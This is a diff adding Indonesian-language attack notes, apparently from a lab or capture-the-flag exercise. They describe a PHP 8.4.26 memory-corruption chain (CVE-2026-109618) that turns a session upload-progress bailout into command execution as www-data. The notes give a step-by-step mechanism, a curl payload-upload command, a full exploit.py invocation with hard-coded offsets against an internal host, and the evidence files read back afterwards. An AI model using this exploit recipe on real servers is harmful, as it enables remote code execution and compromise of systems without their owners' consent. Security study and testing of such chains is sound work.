@@ -1,0 +1,36 @@
+Foothold: PHP2Shell / CVE-2026-109618 pada PHP 8.4.26 mod_php.
+
+Mekanisme singkat:
+  1. Kirim multipart POST dengan field PHP_SESSION_UPLOAD_PROGRESS.
+  2. session.upload_progress memproses request sebelum RINIT aplikasi.
+  3. OOM bailout (memory_limit=8M) meninggalkan pointer session yang dangling.
+  4. Dua Set-Cookie out-of-bounds read membocorkan Zend MM chunk base dan
+     libphp base.
+  5. Fake HashTable dengan pDestructor = zif_system dieksekusi saat cleanup.
+  6. Hasil: command execution sebagai www-data, tanpa session_start() di aplikasi.
+
+Tool: 9bie / 3em0 php2shell (exploit.py).
+
+# Stage 0 — upload script payload melalui form upload biasa.
+# /out/ web-served dan writable www-data, jadi script bisa diambil lagi.
+curl -sS -F 'PHP_SESSION_UPLOAD_PROGRESS=x' \
+  -F 'file=@script;filename=c' \
+  http://10.10.20.22/upload.php
+
+# Stage 1 — jalankan chain. Command dibatasi 14 byte, jadi pakai sh</out/c.
+cd /tmp/p2s
+python3 exploit.py -u http://10.10.20.22/index.php \
+  --offsets-file '' --no-auto-offsets --proof-file '' --fetch /out/p1 \
+  -c 'sh</out/c' \
+  --zif-offset 0x465370 --dtor-offset 0x65eb60 \
+  --htdata-offset 0x690d8 --huge-mb 12 --retries 3 --timeout 90
+
+Offset yang dipakai (official PHP 8.4.26 trixie amd64):
+  zif_system       0x465370
+  ZVAL_PTR_DTOR    0x65eb60
+  htdata           0x690d8
+  --huge-mb 12     (12 MB field untuk memicu OOM / worker rotation)
+
+Output exploit mentah tidak tersimpan di notes. Bukti eksekusi adalah file
+yang dibuat script di /out/: recon.txt, src.txt, ucp.txt, root.txt.
+File-file itu kemudian dibaca via HTTP dari /out/.
